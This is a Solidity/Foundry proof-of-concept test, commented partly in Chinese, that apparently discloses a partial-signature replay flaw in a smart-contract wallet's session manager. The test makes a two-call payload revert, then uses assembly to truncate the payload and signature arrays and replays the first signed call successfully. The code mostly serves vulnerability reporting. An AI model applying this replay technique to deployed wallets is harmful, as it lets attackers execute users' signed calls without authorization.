// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.27;

import { Vm, console } from "forge-std/Test.sol";
import { SessionTestBase } from "test/extensions/sessions/SessionTestBase.sol";

import { PrimitivesRPC } from "test/utils/PrimitivesRPC.sol";

import { Factory } from "src/Factory.sol";
import { Stage1Module } from "src/Stage1Module.sol";
import { SessionErrors } from "src/extensions/sessions/SessionErrors.sol";
import { SessionManager } from "src/extensions/sessions/SessionManager.sol";
import { SessionSig } from "src/extensions/sessions/SessionSig.sol";
import { SessionPermissions } from "src/extensions/sessions/explicit/IExplicitSessionManager.sol";
import {
  ParameterOperation,
  ParameterRule,
  Permission,
  UsageLimit
} from "src/extensions/sessions/explicit/Permission.sol";

import { Attestation, LibAttestation } from "src/extensions/sessions/implicit/Attestation.sol";
import { Calls } from "src/modules/Calls.sol";
import { ERC4337v07 } from "src/modules/ERC4337v07.sol";
import { Payload } from "src/modules/Payload.sol";
import { ISapient } from "src/modules/interfaces/ISapient.sol";

// 模拟一个会因特定条件而失败的合约，用来触发REVERT_ON_ERROR。
contract Emitter {

  using LibAttestation for Attestation;

  event Implicit(address sender);
  event Explicit(address sender);

  error InvalidCall(string reason);

  uint256 counter; // 用于触发失败

  // Deliberately revert on the second call to emulate calls' revert behavior
  modifier notTwice() {
    counter++;
    console.log("Counter: ", counter);
    if (counter == 2) {
      // 第二次调用时回滚
      console.log("Original execution reverts");
      revert("NotTwice");
    }
    _;
  }

  // 隐式会话方法 （会在第二次调用时失败）
  function implicitEmit() external notTwice {
    emit Implicit(msg.sender);
  }

  // 显示会话方法
  function explicitEmit() external {
    emit Explicit(msg.sender);
  }

  // 验证隐式请求的方法（会话系统需要）
  function acceptImplicitRequest(
    address wallet,
    Attestation calldata attestation,
    Payload.Call calldata call
  ) external pure returns (bytes32) {
    // 检查调用是否是implicitEmit
    if (call.data.length != 4 || bytes4(call.data[:4]) != this.implicitEmit.selector) {
      return bytes32(0);
    }
    // 返回magic值表示接受此隐式请求
    return attestation.generateImplicitRequestMagic(wallet);
  }

}

contract POC is SessionTestBase {

  // 1. 准备测试环境
  Factory public factory;
  Stage1Module public module;
  SessionManager public sessionManager;
  Vm.Wallet public sessionWallet; // 会话签名者
  Vm.Wallet public identityWallet; // 身份签名者
  Emitter public target; // 目标合约（被调用的合约）
  address wallet; // Sequence 钱包地址
  string config;
  string topology;

  // 2. 初始化测试环境
  function setUp() public {
    // 创建两个测试钱包
    sessionWallet = vm.createWallet("session"); // 会话签名者
    identityWallet = vm.createWallet("identity"); // 身份签名者

    // 部署核心合约
    sessionManager = new SessionManager(); // 会话管理器
    factory = new Factory(); // 钱包工厂
    module = new Stage1Module(address(factory), address(0));
    target = new Emitter(); // 目标合约

    // 创建空的会话配置
    topology = PrimitivesRPC.sessionEmpty(vm, identityWallet.addr);
    SessionPermissions memory sessionPerms = SessionPermissions({
      signer: sessionWallet.addr, // 谁可以签名
      chainId: 0, // 0表示任意链
      valueLimit: 0, // 不允许发送ETH
      deadline: uint64(block.timestamp + 1 days), // 24小时有效期
      permissions: new Permission[](1) // 权限列表
    });

    // 设置权限：允许调用target合约的任何方法
    sessionPerms.permissions[0] = Permission({
      target: address(target), // 目标合约地址
      rules: new ParameterRule[](0) // 无参数限制
    });

    // 将显式权限添加到topology
    string memory sessionPermsJson = _sessionPermissionsToJSON(sessionPerms);
    topology = PrimitivesRPC.sessionExplicitAdd(vm, sessionPermsJson, topology);

    // 添加隐式权限（黑名单地址0）
    topology = PrimitivesRPC.sessionImplicitAddBlacklistAddress(vm, topology, address(0));

    // 计算会话配置的hash
    bytes32 sessionImageHash = PrimitivesRPC.sessionImageHash(vm, topology);

    {
      // 创建钱包配置字符串
      string memory ce = string(
        abi.encodePacked(
          "sapient:", // 协议前缀
          vm.toString(sessionImageHash),
          ":", // 会话配置hash
          vm.toString(address(sessionManager)), // 会话管理器地址
          ":1" // 版本号
        )
      );
      config = PrimitivesRPC.newConfig(vm, 1, 0, ce);
    }
    // 从配置计算最终的imageHash
    bytes32 imageHash = PrimitivesRPC.getImageHash(vm, config);

    // 使用imageHash部署钱包
    wallet = factory.deploy(address(module), imageHash);
  }

  // 3. 执行攻击演示
  function testSubmissionValidity() external {
    // 创建包含2个调用的payload
    // A session signer creates a payload of 2 calls, both of them has REVERT_ON_ERROR behavior
    Payload.Decoded memory payload = _buildPayload(2);

    // 创建有效的attestation（隐式会话需要）
    Attestation memory attestation = _createValidAttestation();
    // 第1个调用：implicitEmit（会成功）
    payload.calls[0] = Payload.Call({
      to: address(target),
      value: 0,
      data: abi.encodeWithSelector(target.implicitEmit.selector),
      gasLimit: 0,
      delegateCall: false,
      onlyFallback: false,
      behaviorOnError: Payload.BEHAVIOR_REVERT_ON_ERROR // ← 关键
    });

    // 第2个调用：implicitEmit（会失败）
    payload.calls[1] = Payload.Call({
      to: address(target),
      value: 0,
      data: abi.encodeWithSelector(target.implicitEmit.selector),
      gasLimit: 0,
      delegateCall: false,
      onlyFallback: false,
      behaviorOnError: Payload.BEHAVIOR_REVERT_ON_ERROR // ← 关键
    });

    // 为每个调用创建隐式签名
    string[] memory callSignatures = _createImplicitCallSignatures(payload, attestation);
    // 编码签名
    bytes memory encodedSignature = _createEncodedCallSignature(callSignatures);
    // 编码payload
    bytes memory packedPayload = PrimitivesRPC.toPackedPayload(vm, payload);
    console.log("Original execution starts");

    // 执行应该失败（第2个调用会revert）
    // The second call fails and the whole flow is reverted
    vm.expectRevert();
    Calls(wallet).execute(packedPayload, encodedSignature);

    // now the attacker can reuse partial signature to replay the calls just before the failed one
    {
      Payload.Call[] memory calls = payload.calls;
      assembly {
        mstore(calls, 1) // discard the last call from payload
        mstore(callSignatures, 1) // reuse the first call sig, discard the last one
      }

      // The following helpers don't re-generate/override call signatures
      bytes memory encodedSignature = _createEncodedCallSignature(callSignatures);
      bytes memory packedPayload = PrimitivesRPC.toPackedPayload(vm, payload);
      console.log("Attacker partial replay starts");

      Calls(wallet).execute(packedPayload, encodedSignature);
      console.log("Attacker partial replay succeeded");
    }
  }

  function _createValidAttestation() internal view returns (Attestation memory) {
    Attestation memory attestation;
    attestation.approvedSigner = sessionWallet.addr;
    attestation.authData.redirectUrl = "https://example.com";
    attestation.authData.issuedAt = uint64(block.timestamp);
    return attestation;
  }

  function _createImplicitCallSignatures(
    Payload.Decoded memory payload,
    Attestation memory attestation
  ) internal returns (string[] memory callSignatures) {
    uint256 callCount = payload.calls.length;
    callSignatures = new string[](callCount);

    // 为每个调用单独创建签名
    for (uint256 i; i < callCount; i++) {
      callSignatures[i] = _createImplicitCallSignature(
        payload,
        i, // 调用索引
        sessionWallet, // 会话签名者
        identityWallet, // 身份签名者
        attestation
      );
    }
  }

  function _createEncodedCallSignature(
    string[] memory callSignatures
  ) internal returns (bytes memory encodedSig) {
    address[] memory explicitSigners = new address[](0);
    address[] memory implicitSigners = new address[](1);
    implicitSigners[0] = sessionWallet.addr;
    encodedSig =
      PrimitivesRPC.sessionEncodeCallSignatures(vm, topology, callSignatures, explicitSigners, implicitSigners);
    string memory signatures =
      string(abi.encodePacked(vm.toString(address(sessionManager)), ":sapient:", vm.toString(encodedSig)));
    encodedSig = PrimitivesRPC.toEncodedSignature(vm, config, signatures, false);
  }

}
